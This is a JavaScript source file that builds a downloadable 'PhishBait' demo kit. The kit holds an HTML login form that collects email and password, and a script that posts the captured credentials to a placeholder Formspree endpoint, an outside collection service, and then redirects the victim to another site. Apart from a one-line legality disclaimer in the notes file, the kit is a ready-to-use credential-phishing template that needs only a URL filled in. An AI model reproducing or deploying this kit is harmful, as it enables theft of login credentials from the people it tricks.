document.addEventListener("DOMContentLoaded", () => {
    document.getElementById("download-demo").addEventListener("click", () => {
        const zip = new JSZip();

        const htmlContent = `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8" />
<title>PhishBait Demo</title>
</head>
<body>
<form id="phishy-form" action="<your formspree url>" method="POST">
  <label>Email:</label>
  <input type="email" name="email" required />
  <label>Password:</label>
  <input type="text" name="userkey" required />
  <button id="my-form-button">Submit</button>
</form>
<script src="script.js"><\/script>
</body>
</html>`;

        const jsContent = `document
.getElementById("phishy-form")
.addEventListener("submit", async function (e) {
e.preventDefault();
let formData = new FormData(this);
try {
  let response = await fetch("<your formspree url>", {
    method: "POST",
    body: formData,
    headers: { Accept: "application/json" },
  });

  if (response.ok) {
    window.location.href = "https://www.example.com/";
  }
} catch (error) {
  console.error("Error: ", error);
}
});`;

        const notesContent = `This project demonstrates how a basic phishing form can be created using HTML and JavaScript, 
and how form data can be captured and sent for free using a service like Formspree.

Using this code for malicious purposes is illegal.`;

        zip.file("index.html", htmlContent);
        zip.file("script.js", jsContent);
        zip.file("notes.txt", notesContent);

        zip.generateAsync({ type: "blob" }).then((content) => {
            const a = document.createElement("a");
            a.href = URL.createObjectURL(content);
            a.download = "phishbait-demo.zip";
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
        });
    });
});
